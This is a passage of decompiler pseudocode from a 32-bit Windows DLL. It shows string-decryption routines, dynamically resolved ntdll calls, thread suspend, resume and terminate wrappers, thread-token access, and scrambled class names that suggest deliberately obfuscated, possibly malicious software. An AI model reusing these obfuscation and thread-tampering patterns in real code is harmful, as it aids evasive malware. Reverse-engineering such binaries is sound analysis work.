  return ((a1 + 5) * (a1 + 26)) ^ ((unsigned int)((a1 + 5) * (a1 + 26)) >> 8) ^ ((((a1 + 5) * (a1 + 26)) ^ ((unsigned int)((a1 + 5) * (a1 + 26)) >> 8)) >> 16);
}

//----- (1000E8D4) --------------------------------------------------------
void __cdecl sub_1000E8D4(int a1, unsigned int a2)
{
  unsigned int i; // edi

  for ( i = 0; i < a2; ++i )
    *(_BYTE *)(i + a1) -= sub_1000E895(i);
}

//----- (1000E8F9) --------------------------------------------------------
int __cdecl sub_1000E8F9(int a1)
{
  int result; // eax
  unsigned int v3; // [esp-4h] [ebp-10h]
  int v4; // [esp+14h] [ebp+8h]

  if ( !*(_BYTE *)(a1 + 8) )
    return a1 + 11;
  v3 = *(unsigned __int16 *)(a1 + 9);
  v4 = a1 + 11;
  sub_1000E8D4(v4, v3);
  result = v4;
  *(_BYTE *)(a1 + 8) = 0;
  return result;
}

//----- (1000E943) --------------------------------------------------------
int __cdecl sub_1000E943(int a1)
{
  if ( *(_WORD *)(a1 + 16) )
  {
    sub_1000E8D4(a1 + 20, *(unsigned __int16 *)(a1 + 18));
    *(_WORD *)(a1 + 16) = 0;
  }
  return a1 + 20;
}

//----- (1000E98B) --------------------------------------------------------
_DWORD *__stdcall sub_1000E98B(_DWORD *a1, void *a2, char a3)
{
  sub_10014DA7(a1, a2, a3);
  a1[2] = -1;
  *a1 = &off_1009376C;
  return a1;
}
// 1009376C: using guessed type int (__thiscall *off_1009376C)(void *Block, char);

//----- (1000E9C2) --------------------------------------------------------
int *__thiscall sub_1000E9C2(int *Block, char a2)
{
  sub_10001B5C(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000E9E2) --------------------------------------------------------
_DWORD *__stdcall sub_1000E9E2(_DWORD *a1, void *a2, char a3)
{
  sub_1000E98B(a1, a2, a3);
  *a1 = &off_10093788;
  return a1;
}
// 10093788: using guessed type int (__thiscall *off_10093788)(void *Block, char);

//----- (1000EA15) --------------------------------------------------------
int *__thiscall sub_1000EA15(int *Block, char a2)
{
  sub_1000EA34(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000EA34) --------------------------------------------------------
LONG __thiscall sub_1000EA34(int *this)
{
  *this = (int)&off_10093788;
  return sub_10001B5C(this);
}
// 10093788: using guessed type int (__thiscall *off_10093788)(void *Block, char);

//----- (1000EA59) --------------------------------------------------------
DWORD __thiscall sub_1000EA59(_DWORD *this)
{
  int v1; // eax
  _DWORD pExceptionObject[3]; // [esp+0h] [ebp-10h] BYREF
  DWORD ExitCode; // [esp+Ch] [ebp-4h] BYREF

  v1 = this[1];
  ExitCode = 0;
  if ( !GetExitCodeThread(*(HANDLE *)(v1 + 16), &ExitCode) )
  {
    sub_100167F9(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  return ExitCode;
}
// 1000EA59: using guessed type _DWORD pExceptionObject[3];

//----- (1000EA95) --------------------------------------------------------
char __thiscall sub_1000EA95(_DWORD *this, DWORD dwExitCode)
{
  int v3; // eax
  _DWORD pExceptionObject[3]; // [esp+4h] [ebp-Ch] BYREF

  LOBYTE(v3) = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( (_BYTE)v3 )
  {
    LOBYTE(v3) = sub_10014F97((int)this);
    if ( !(_BYTE)v3 )
    {
      v3 = TerminateThread(*(HANDLE *)(this[1] + 16), dwExitCode);
      if ( !v3 )
      {
        sub_100167F9(pExceptionObject, 1);
        _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
      }
    }
  }
  return v3;
}
// 1000EA95: using guessed type _DWORD pExceptionObject[3];

//----- (1000EAE2) --------------------------------------------------------
int __stdcall sub_1000EAE2(int a1, void *pExceptionObject)
{
  wchar_t *v2; // eax
  int v3; // ecx
  int v4; // ecx
  int result; // eax
  int v6; // [esp-10h] [ebp-34h] BYREF
  int v7; // [esp-Ch] [ebp-30h]
  int v8[10]; // [esp-8h] [ebp-2Ch] BYREF
  int v9; // [esp+20h] [ebp-4h]

  if ( (dword_100BF9B4 & 1) == 0 )
  {
    dword_100BF9B4 |= 1u;
    v9 = 0;
    v2 = (wchar_t *)sub_1000E943((int)&unk_100B82C0);
    v8[0] = v3;
    v8[7] = (int)v8;
    sub_1000CC20(v8, v2);
    LOBYTE(v9) = 1;
    v7 = v4;
    v6 = v4;
    v8[6] = (int)&v6;
    sub_1000CC20(&v6, aNtdllDll);
    LOBYTE(v9) = 0;
    dword_100BC720 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_1002481B(v6, v7, v8[0]);
    v9 = -1;
  }
  memset(pExceptionObject, 0, 0x1Cu);
  result = dword_100BC720(*(_DWORD *)(*(_DWORD *)(a1 + 4) + 16), 0, pExceptionObject, 28, 0);
  if ( result < 0 )
  {
    sub_10016441(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  return result;
}
// 1000EB0D: variable 'v3' is possibly undefined
// 1000EB1E: variable 'v4' is possibly undefined
// 100B8318: using guessed type wchar_t aNtdllDll[10];
// 100BC720: using guessed type int (__stdcall *dword_100BC720)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 100BF9B4: using guessed type int dword_100BF9B4;

//----- (1000EB8F) --------------------------------------------------------
int __thiscall sub_1000EB8F(_DWORD *this)
{
  char v2[12]; // [esp+0h] [ebp-1Ch] BYREF
  int v3; // [esp+Ch] [ebp-10h]

  if ( !*(_DWORD *)(this[1] + 16) )
    return -1;
  sub_1000EAE2((int)this, v2);
  return v3;
}
// 1000EB8F: using guessed type char var_1C[12];

//----- (1000EBB2) --------------------------------------------------------
bool __thiscall sub_1000EBB2(_DWORD *this)
{
  DWORD v1; // eax
  _DWORD pExceptionObject[3]; // [esp+0h] [ebp-Ch] BYREF

  v1 = ResumeThread(*(HANDLE *)(this[1] + 16));
  if ( v1 == -1 )
  {
    sub_100167F9(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  return v1 <= 1;
}
// 1000EBB2: using guessed type _DWORD pExceptionObject[3];

//----- (1000EBEC) --------------------------------------------------------
_DWORD *__thiscall sub_1000EBEC(void *this, _DWORD *a2, DWORD a3)
{
  char v4[8]; // [esp+10h] [ebp-2Ch] BYREF
  DWORD v5; // [esp+18h] [ebp-24h]
  int v6; // [esp+2Ch] [ebp-10h]

  v6 = 0;
  sub_1000EAE2((int)this, v4);
  sub_10022A56(v5, a2, a3);
  return a2;
}
// 1000EBEC: using guessed type char var_2C[8];

//----- (1000EC2C) --------------------------------------------------------
DWORD __thiscall sub_1000EC2C(_DWORD *this)
{
  DWORD result; // eax
  _DWORD pExceptionObject[3]; // [esp+0h] [ebp-Ch] BYREF

  result = SuspendThread(*(HANDLE *)(this[1] + 16));
  if ( result == -1 )
  {
    sub_100167F9(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  return result;
}
// 1000EC2C: using guessed type _DWORD pExceptionObject[3];

//----- (1000EC5D) --------------------------------------------------------
_DWORD *__usercall sub_1000EC5D@<eax>(DWORD a1@<ebx>, _DWORD *a2, DWORD dwDesiredAccess)
{
  HANDLE v3; // eax
  _DWORD pExceptionObject[7]; // [esp+10h] [ebp-1Ch] BYREF

  pExceptionObject[6] = 0;
  pExceptionObject[3] = 0;
  v3 = OpenThread(dwDesiredAccess, 0, a1);
  if ( !v3 )
  {
    sub_100167F9(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  sub_1000E9E2(a2, v3, 0);
  a2[2] = a1;
  return a2;
}

//----- (1000ECB8) --------------------------------------------------------
_DWORD *__userpurge sub_1000ECB8@<eax>(int a1@<edi>, _DWORD *a2)
{
  sub_1000ECE5(a1, a2);
  *a2 = &off_10093788;
  return a2;
}
// 10093788: using guessed type int (__thiscall *off_10093788)(void *Block, char);

//----- (1000ECE5) --------------------------------------------------------
_DWORD *__userpurge sub_1000ECE5@<eax>(int a1@<edi>, _DWORD *a2)
{
  sub_1000ED19(a2, a1);
  *a2 = &off_1009376C;
  a2[2] = *(_DWORD *)(a1 + 8);
  return a2;
}
// 1009376C: using guessed type int (__thiscall *off_1009376C)(void *Block, char);

//----- (1000ED19) --------------------------------------------------------
_DWORD *__stdcall sub_1000ED19(_DWORD *a1, int a2)
{
  *a1 = &off_1009375C;
  a1[1] = *(_DWORD *)(a2 + 4);
  sub_1000EE1D(a1 + 1);
  return a1;
}
// 1009375C: using guessed type int (__thiscall *off_1009375C)(void *Block, char);

//----- (1000ED4C) --------------------------------------------------------
int *__thiscall sub_1000ED4C(int *Block, char a2)
{
  sub_10014DFB(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000ED6B) --------------------------------------------------------
_DWORD *__thiscall sub_1000ED6B(_DWORD *this, _DWORD *a2, char a3, DWORD DesiredAccess)
{
  int v4; // eax
  HANDLE pExceptionObject[4]; // [esp+10h] [ebp-20h] BYREF
  HANDLE TokenHandle; // [esp+20h] [ebp-10h] BYREF

  pExceptionObject[3] = 0;
  v4 = this[1];
  TokenHandle = 0;
  if ( !OpenThreadToken(*(HANDLE *)(v4 + 16), DesiredAccess, a3 != 0, &TokenHandle) )
  {
    sub_100167F9(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  sub_10024B21(a2, TokenHandle);
  return a2;
}

//----- (1000EDE9) --------------------------------------------------------
LONG __stdcall sub_1000EDE9(int *a1)
{
  LONG result; // eax

  result = (LONG)a1;
  if ( *a1 )
    return sub_10016377(*a1);
  return result;
}

//----- (1000EE1D) --------------------------------------------------------
LONG __usercall sub_1000EE1D@<eax>(int *a1@<esi>)
{
  LONG result; // eax
  void *v2; // eax
  int v3; // eax

  result = *a1;
  if ( *a1 )
  {
    if ( !*(_BYTE *)(result + 8) )
    {
      v2 = operator new(0x14u);
      if ( v2 )
        v3 = sub_10014D20((int)v2, *a1);
      else
        v3 = 0;
      *a1 = v3;
    }
    return InterlockedIncrement((volatile LONG *)(*a1 + 4));
  }
  return result;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1000EE6C) --------------------------------------------------------
_DWORD *__stdcall sub_1000EE6C(_DWORD *a1)
{
  sub_1000EF17(a1);
  sub_1000EEB8((int)a1);
  return a1;
}

//----- (1000EE98) --------------------------------------------------------
void *__stdcall sub_1000EE98(_DWORD *a1)
{
  return sub_10009F6C(a1);
}

//----- (1000EEB8) --------------------------------------------------------
void *__usercall sub_1000EEB8@<eax>(int a1@<esi>)
{
  int v1; // eax
  int v3; // [esp+0h] [ebp-24h] BYREF
  _DWORD v4[8]; // [esp+4h] [ebp-20h] BYREF

  sub_1001D82E(v4);
  v4[7] = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)a1 + 56))(a1, v1);
  v4[6] = -1;
  return sub_10009F6C(&v3);
}
// 1000EEF6: variable 'v1' is possibly undefined

//----- (1000EF17) --------------------------------------------------------
_DWORD *__stdcall sub_1000EF17(_DWORD *a1)
{
  sub_1000EF4E(a1);
  *a1 = &off_10093478;
  a1[1] = 0;
  a1[2] = 0;
  a1[3] = 0;
  return a1;
}
// 10093478: using guessed type int (__thiscall *off_10093478)(void *Block, char);

//----- (1000EF4E) --------------------------------------------------------
_DWORD *__stdcall sub_1000EF4E(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = off_10092F20;
  *a1 = &off_100934B8;
  return result;
}
// 10092F20: using guessed type int (__thiscall *off_10092F20[2])(void *Block, char);
// 100934B8: using guessed type int (__thiscall *off_100934B8)(void *Block, char);

//----- (1000EFCA) --------------------------------------------------------
void sub_1000EFCA()
{
  __time32_t v0; // esi
  DWORD CurrentThreadId; // eax

  v0 = time(0);
  CurrentThreadId = GetCurrentThreadId();
  srand(v0 + CurrentThreadId);
}

//----- (1000EFF0) --------------------------------------------------------
LONG __stdcall sub_1000EFF0(int *a1)
{
  LONG result; // eax

  *a1 = (int)&off_100937B4;
  sub_1000CE59(a1 + 7);
  sub_1000CE59(a1 + 4);
  result = sub_1000CE59(a1 + 2);
  *a1 = (int)&off_10092F00;
  return result;
}
// 10092F00: using guessed type int (__thiscall *off_10092F00)(void *Block, char);
// 100937B4: using guessed type int (__thiscall *off_100937B4)(void *Block, char);

//----- (1000F03E) --------------------------------------------------------
int *__thiscall sub_1000F03E(int *Block, char a2)
{
  sub_1000EFF0(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000F05E) --------------------------------------------------------
LONG __stdcall sub_1000F05E(int *a1)
{
  sub_1000F6AA(a1 + 9);
  return sub_100172B1(a1);
}

//----- (1000F08C) --------------------------------------------------------
int __stdcall sub_1000F08C(int a1)
{
  sub_10017224(a1);
  sub_1000F673((_DWORD *)(a1 + 36));
  return a1;
}

//----- (1000F0BC) --------------------------------------------------------
char sub_1000F0BC()
{
  unsigned int v0; // esi
  char v2; // bl
  DWORD *v3; // eax
  _DWORD *v4; // eax
  _DWORD *v5; // eax
  char v6; // [esp+17h] [ebp-95h] BYREF
  int v7[3]; // [esp+18h] [ebp-94h] BYREF
  int v8; // [esp+24h] [ebp-88h] BYREF
  unsigned int v9; // [esp+28h] [ebp-84h]
  int v10[6]; // [esp+34h] [ebp-78h] BYREF
  int v11[10]; // [esp+4Ch] [ebp-60h] BYREF
  int v12[11]; // [esp+74h] [ebp-38h] BYREF
  int v13; // [esp+A8h] [ebp-4h]

  sub_10007816(&v8);
  v0 = 0;
  v13 = 0;
  if ( sub_1000F312((int)&v8) )
  {
    sub_1000CC20(v7, &word_100B8064);
    LOBYTE(v13) = 1;
    sub_1002798B((int)v12, (int)&unk_100BF6B0, (int)v7);
    LOBYTE(v13) = 3;
    sub_1000CE59(v7);
    sub_1000CC20(v7, word_100B819C);
    LOBYTE(v13) = 4;
    sub_1002798B((int)v11, (int)&unk_100BF6A8, (int)v7);
    LOBYTE(v13) = 6;
    sub_1000CE59(v7);
    if ( sub_10027AA1(v12) || sub_10027AA1(v11) )
    {
      sub_1001001D((__int32)&v6, (int)&v6);
      if ( v9 )
      {
        do
        {
          v3 = (DWORD *)(*(int (__thiscall **)(int *, unsigned int))(v8 + 44))(&v8, v0);
          v4 = sub_10022A56(*v3, v7, 0x400u);
          LOBYTE(v13) = 7;
          v5 = sub_10026439((int)v4, v10);
          LOBYTE(v13) = 8;
          sub_10027677((int)v5, (int *)dword_100BBD44);
          LOBYTE(v13) = 7;
          sub_100264A5(v10);
          LOBYTE(v13) = 6;
          sub_10001FCC(v7);
          ++v0;
        }
        while ( v0 < v9 );
      }
      v2 = 1;
    }
    else
    {
      v2 = 0;
    }
    LOBYTE(v13) = 3;
    sub_1000EFF0(v11);
    LOBYTE(v13) = 0;
    sub_1000EFF0(v12);
    v13 = -1;
    sub_10007890((int)&v8);
    return v2;
  }
  else
  {
    v13 = -1;
    sub_10007890((int)&v8);
    return 0;
  }
}
// 100B8064: using guessed type wchar_t word_100B8064;
// 100B819C: using guessed type wchar_t word_100B819C[2];
// 100BBD44: using guessed type int dword_100BBD44;
// 1000F0BC: using guessed type int var_94[3];
// 1000F0BC: using guessed type int var_38[11];
// 1000F0BC: using guessed type int var_60[10];
// 1000F0BC: using guessed type int var_78[6];

//----- (1000F28E) --------------------------------------------------------
bool sub_1000F28E()
{
  bool v0; // bl
  int v2[10]; // [esp+10h] [ebp-4Ch] BYREF
  _DWORD v3[4]; // [esp+38h] [ebp-24h] BYREF
  int v4[4]; // [esp+48h] [ebp-14h] BYREF
  int v5; // [esp+58h] [ebp-4h]

  sub_10007816(v3);
  v5 = 0;
  if ( sub_1000F312((int)v3) )
  {
    sub_1000CC20(v4, &word_100B82BC);
    LOBYTE(v5) = 1;
    sub_1002798B((int)v2, (int)&unk_100BF6B0, (int)v4);
    LOBYTE(v5) = 3;
    sub_1000CE59(v4);
    v0 = sub_10027AA1(v2);
    LOBYTE(v5) = 0;
    sub_1000EFF0(v2);
  }
  else
  {
    v0 = 0;
  }
  v5 = -1;
  sub_10007890((int)v3);
  return v0;
}
// 100B82BC: using guessed type wchar_t word_100B82BC;
// 1000F28E: using guessed type _DWORD var_24[4];
// 1000F28E: using guessed type int var_14[4];
// 1000F28E: using guessed type int var_4C[10];

//----- (1000F312) --------------------------------------------------------
bool __usercall sub_1000F312@<al>(int a1@<edi>)
{
  int v1; // eax
  void *v2; // ecx
  int v3; // eax
  _DWORD *v4; // eax
  _DWORD *v5; // eax
  bool v6; // bl
  int v7; // ecx
  int v9[4]; // [esp+10h] [ebp-40h] BYREF
  int v10[4]; // [esp+20h] [ebp-30h] BYREF
  int v11[2]; // [esp+30h] [ebp-20h] BYREF
  int v12[2]; // [esp+38h] [ebp-18h] BYREF
  int v13[3]; // [esp+40h] [ebp-10h] BYREF
  int v14; // [esp+4Ch] [ebp-4h]

  v1 = sub_10015E65();
  if ( v1 != 6 && v1 != 7 )
    return 0;
  v3 = sub_10015E7B(v2);
  if ( v3 == 3 || v3 == 2 )
    return 0;
  sub_1000EE6C(v9);
  v14 = 0;
  (*(void (__thiscall **)(int *, int *))(v9[0] + 8))(v9, v12);
  LOBYTE(v14) = 1;
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v12[0] + 4))(v12[0]) )
  {
    v4 = (_DWORD *)(*(int (__thiscall **)(int))(*(_DWORD *)v12[0] + 12))(v12[0]);
    sub_1000AA12(v10, v4);
    LOBYTE(v14) = 2;
    v5 = sub_1001D7F9((int)v10, v11);
    LOBYTE(v14) = 3;
    v6 = sub_1000D84E((int)v5, (int)&unk_100BF6A0);
    LOBYTE(v14) = 2;
    sub_1000CE59(v11);
    if ( v6 )
    {
      v13[0] = v10[0];
      (*(void (__thiscall **)(int, int *))(*(_DWORD *)a1 + 36))(a1, v13);
    }
    sub_1000A59A(v7, v12[0]);
    LOBYTE(v14) = 1;
    sub_1000A4C9((int)v10);
  }
  LOBYTE(v14) = 0;
  sub_1000AE88(v12);
  v14 = -1;
  sub_1000EE98(v9);
  return (*(int (__thiscall **)(int))(*(_DWORD *)a1 + 4))(a1) != 0;
}
// 1000F331: variable 'v2' is possibly undefined
// 1000F3BF: variable 'v7' is possibly undefined
// 1000F312: using guessed type int var_10[3];

//----- (1000F40C) --------------------------------------------------------
void __thiscall sub_1000F40C(_DWORD *this)
{
  *this = &off_10093860;
  *this = off_10092F20;
}
// 10092F20: using guessed type int (__thiscall *off_10092F20[2])(void *Block, char);
// 10093860: using guessed type int (__thiscall *off_10093860)(void *Block, char);

//----- (1000F431) --------------------------------------------------------
int *__thiscall sub_1000F431(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_1000F9E1(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 1000F487: variable 'v5' is possibly undefined

//----- (1000F499) --------------------------------------------------------
int *__thiscall sub_1000F499(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 8))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_1000FA25(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 1000F4EF: variable 'v5' is possibly undefined

//----- (1000F501) --------------------------------------------------------
void __thiscall sub_1000F501(void *this, int a2)
{
  int v2[4]; // [esp+10h] [ebp-14h] BYREF
  int v3; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 20))(this, v2);
  v3 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v2[0] + 28))(v2[0], a2);
  v3 = -1;
  sub_10010085(v2);
}

//----- (1000F539) --------------------------------------------------------
void __thiscall sub_1000F539(void *this, int a2, int a3)
{
  int v3[4]; // [esp+10h] [ebp-14h] BYREF
  int v4; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v3, a3);
  v4 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v3[0] + 28))(v3[0], a2);
  v4 = -1;
  sub_10010085(v3);
}

//----- (1000F574) --------------------------------------------------------
void __thiscall sub_1000F574(void *this, int a2)
{
  int v2[4]; // [esp+10h] [ebp-14h] BYREF
  int v3; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v2, a2);
  v3 = 0;
  (*(void (__thiscall **)(int))(*(_DWORD *)v2[0] + 24))(v2[0]);
  v3 = -1;
  sub_10010085(v2);
}

//----- (1000F5AC) --------------------------------------------------------
int __thiscall sub_1000F5AC(void *this, int a2)
{
  int v2; // esi
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 24))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_10010109(v4);
  return v2;
}

//----- (1000F5E8) --------------------------------------------------------
int __thiscall sub_1000F5E8(void *this, int a2)
{
  int v2; // esi
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_10010085(v4);
  return v2;
}

//----- (1000F624) --------------------------------------------------------
void __thiscall sub_1000F624(void *this)
{
  int v1[4]; // [esp+10h] [ebp-14h] BYREF
  int v2; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, v1);
  v2 = 0;
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v1[0] + 4))(v1[0]) )
    (*(void (__thiscall **)(int))(*(_DWORD *)v1[0] + 24))(v1[0]);
  v2 = -1;
  sub_10010085(v1);
}

//----- (1000F673) --------------------------------------------------------
_DWORD *__stdcall sub_1000F673(_DWORD *a1)
{
  sub_1000F9B1(a1);
  *a1 = &off_100938D8;
  a1[1] = 0;
  a1[2] = 0;
  a1[3] = 0;
  return a1;
}
// 100938D8: using guessed type int (__thiscall *off_100938D8)(void *Block, char);

//----- (1000F6AA) --------------------------------------------------------
void __thiscall sub_1000F6AA(_DWORD *this)
{
  int *i; // eax
  int *v3; // edi

  *this = &off_100938D8;
  for ( i = (int *)this[1]; i; i = v3 )
  {
    v3 = (int *)i[6];
    sub_1000F93C(i);
  }
  sub_1000F40C(this);
}
// 100938D8: using guessed type int (__thiscall *off_100938D8)(void *Block, char);

//----- (1000F701) --------------------------------------------------------
void *__thiscall sub_1000F701(void *this, int a2)
{
  sub_1000FA56(a2, (int)this);
  return this;
}

//----- (1000F716) --------------------------------------------------------
void *__thiscall sub_1000F716(void *this, int a2)
{
  sub_1000FA56(a2, (int)this);
  return this;
}

//----- (1000F72B) --------------------------------------------------------
int __thiscall sub_1000F72B(_DWORD *this)
{
  return this[3];
}

//----- (1000F72F) --------------------------------------------------------
_DWORD *__thiscall sub_1000F72F(int *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0x10u);
  if ( v3 )
    v4 = sub_1000FAB2(this, v3, this[1], 0);
  else
    v4 = 0;
  sub_10010046(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1000F785) --------------------------------------------------------
_DWORD *__thiscall sub_1000F785(int *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0x10u);
  if ( v3 )
    v4 = sub_1000FC9C(this, v3, this[1], 0);
  else
    v4 = 0;
  sub_100100CA(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1000F7DB) --------------------------------------------------------
_DWORD *__thiscall sub_1000F7DB(int *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0x10u);
  if ( v3 )
    v4 = sub_1000FAB2(this, v3, 0, this[2]);
  else
    v4 = 0;
  sub_10010046(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1000F831) --------------------------------------------------------
_DWORD *__thiscall sub_1000F831(int *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0x10u);
  if ( v3 )
    v4 = sub_1000FC9C(this, v3, 0, this[2]);
  else
    v4 = 0;
  sub_100100CA(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1000F887) --------------------------------------------------------
int *__thiscall sub_1000F887(void *this)
{
  int *result; // eax

  *(_DWORD *)this = off_10093918;
  result = (int *)*((_DWORD *)this + 1);
  if ( result )
    return sub_1000F976(*((int **)this + 1));
  return result;
}
// 10093918: using guessed type int (__thiscall *off_10093918[2])(void *Block, char);

//----- (1000F8BE) --------------------------------------------------------
_DWORD *__thiscall sub_1000F8BE(_DWORD *Block, char a2)
{
  sub_1000F40C(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000F8DD) --------------------------------------------------------
_DWORD *__thiscall sub_1000F8DD(_DWORD *Block, char a2)
{
  *Block = &off_10093898;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 10093898: using guessed type int (__thiscall *off_10093898)(void *Block, char);

//----- (1000F8FD) --------------------------------------------------------
_DWORD *__thiscall sub_1000F8FD(_DWORD *Block, char a2)
{
  *Block = &off_100938B8;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 100938B8: using guessed type int (__thiscall *off_100938B8)(void *Block, char);

//----- (1000F91D) --------------------------------------------------------
_DWORD *__thiscall sub_1000F91D(_DWORD *Block, char a2)
{
  sub_1000F6AA(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000F93C) --------------------------------------------------------
int *__stdcall sub_1000F93C(int *Block)
{
  sub_1000F991(Block);
  j__free(Block);
  return Block;
}

//----- (1000F957) --------------------------------------------------------
void *__thiscall sub_1000F957(void *Block, char a2)
{
  sub_1000F887(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000F976) --------------------------------------------------------
int *__stdcall sub_1000F976(int *Block)
{
  sub_1000F05E(Block);
  j__free(Block);
  return Block;
}

//----- (1000F991) --------------------------------------------------------
LONG __stdcall sub_1000F991(int *a1)
{
  return sub_100264A5(a1);
}

//----- (1000F9B1) --------------------------------------------------------
_DWORD *__stdcall sub_1000F9B1(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = off_10092F20;
  *a1 = &off_10093860;
  return result;
}
// 10092F20: using guessed type int (__thiscall *off_10092F20[2])(void *Block, char);
// 10093860: using guessed type int (__thiscall *off_10093860)(void *Block, char);

//----- (1000F9E1) --------------------------------------------------------
int __usercall sub_1000F9E1@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (1000FA25) --------------------------------------------------------
int __usercall sub_1000FA25@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (1000FA56) --------------------------------------------------------
void __usercall sub_1000FA56(int a1@<ecx>, int a2@<edi>)
{
  int v3; // eax
  int v4; // ecx
  int v5[4]; // [esp+10h] [ebp-14h] BYREF
  int v6; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 52))(a2);
